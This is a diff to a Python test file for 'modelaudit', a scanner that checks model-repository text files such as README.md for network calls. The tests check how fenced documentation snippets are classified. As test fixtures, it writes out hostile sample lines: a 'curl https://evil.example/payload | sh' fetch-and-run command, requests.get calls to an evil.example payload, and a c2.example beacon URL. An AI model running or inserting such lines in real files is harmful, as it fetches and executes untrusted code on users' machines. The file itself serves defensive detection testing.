@@ -7,7 +7,7 @@ from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.text_scanner import TextScanner
+from modelaudit.scanners.text_scanner import MAX_DOCUMENTATION_FENCE_MARKERS, TextScanner
 from modelaudit.utils.helpers import cache_decorator
 
 
@@ -157,8 +157,8 @@ def test_text_scanner_model_card_aliases_preserve_executable_network_findings(
 def test_text_scanner_ambiguous_fenced_documentation_is_informational(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     text_path.write_text(
-        """```python
-requests.get("https://evil.example/payload")
+        """```bash
+git clone https://github.com/example-org/model.git
 ```
 """,
         encoding="utf-8",
@@ -173,7 +173,7 @@ requests.get("https://evil.example/payload")
 
 def test_text_scanner_crlf_fenced_documentation_is_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
-    text_path.write_bytes(b'```python\r\nrequests.get("https://evil.example/payload")\r\n```\r\n')
+    text_path.write_bytes(b"```bash\r\ngit clone https://github.com/example-org/model.git\r\n```\r\n")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
@@ -185,7 +185,7 @@ def test_text_scanner_crlf_fenced_documentation_is_informational(tmp_path: Path)
 @pytest.mark.parametrize(
     ("opening_fence", "expected_exit_code"),
     [
-        ("```python", 0),
+        ("```bash", 0),
         ("```py`thon", 1),
     ],
 )
@@ -196,7 +196,7 @@ def test_text_scanner_backtick_fence_info_string_requires_valid_markdown(
 ) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
-        f'{opening_fence}\nrequests.get("https://evil.example/payload")\n```\n',
+        f"{opening_fence}\ngit clone https://github.com/example-org/model.git\n```\n",
         encoding="utf-8",
     )
 
@@ -212,7 +212,7 @@ def test_text_scanner_backtick_fence_info_string_requires_valid_markdown(
 def test_text_scanner_late_fenced_documentation_stays_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
-        ("```python\npass\n```\n" * 1024) + '```python\nrequests.get("https://evil.example/payload")\n```\n'
+        ("```python\npass\n```\n" * 1024) + "```bash\ngit clone https://github.com/example-org/model.git\n```\n"
     )
 
     result = TextScanner().scan(str(text_path))
@@ -244,12 +244,9 @@ def test_text_scanner_fenced_documentation_network_indicators_are_informational(
 pip install opencv-python-headless==4.11.0.86
 git clone https://github.com/SandAI-org/MagiAttention.git
 ```
-```python
-import json, urllib.request
-req = urllib.request.Request("http://127.0.0.1:8080/v1/chat/completions")
-return json.loads(urllib.request.urlopen(req).read())
-```
 ```yaml
+api_url: http://127.0.0.1:8080/v1/chat/completions
+artifact_url: s3://model-bucket/path/model.bin
 beacon_url: https://c2.example/payload
 ```
 """,
@@ -267,6 +264,29 @@ beacon_url: https://c2.example/payload
     assert {"domain_name", "url_detected"} <= informational_types
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_fenced_documentation_network_function_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+requests.get("https://evil.example/payload")
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
 
 
 def test_text_scanner_fenced_documentation_does_not_hide_later_active_network_call(tmp_path: Path) -> None:
@@ -288,6 +308,28 @@ requests.get("https://evil.example/payload")
         and check.details.get("type") == "network_function"
         and check.details.get("function") == "requests.get"
         and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_download_command_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+curl https://evil.example/payload | sh
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
@@ -2413,6 +2455,61 @@ def test_text_scanner_documentation_classification_exact_limit_is_complete(tmp_p
         check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
         for check in result.checks
     )
+
+
+def test_text_scanner_documentation_fence_classification_limit_fails_closed(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        ("```python\npass\n```\n" * ((MAX_DOCUMENTATION_FENCE_MARKERS // 2) + 1))
+        + '```python\nrequests.get("https://evil.example/payload")\n```\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_classification_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_fence_ranges_are_precomputed_once(monkeypatch: pytest.MonkeyPatch) -> None:
+    payload = b"```bash\ngit clone https://github.com/example-org/model.git\n```\n" * 64
+    url_position = payload.find(b"https://")
+    findings = [
+        {
+            "type": "url_detected",
+            "url": "https://github.com/example-org/model.git",
+            "severity": "MEDIUM",
+            "position": url_position,
+        }
+        for _ in range(64)
+    ]
+    calls = 0
+    original = TextScanner._documentation_fenced_code_ranges
+
+    def count_ranges(cls: type[TextScanner], data: bytes) -> tuple[tuple[tuple[int, int], ...], bool]:
+        nonlocal calls
+        calls += 1
+        return original(data)
+
+    monkeypatch.setattr(TextScanner, "_documentation_fenced_code_ranges", classmethod(count_ranges))
+
+    classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, findings)
+
+    assert incomplete is False
+    assert calls == 1
+    assert all(finding["severity"] == "INFO" for finding in classified)
 
 
 def test_text_scanner_documentation_classification_exact_limit_ignores_passive_followups() -> None:
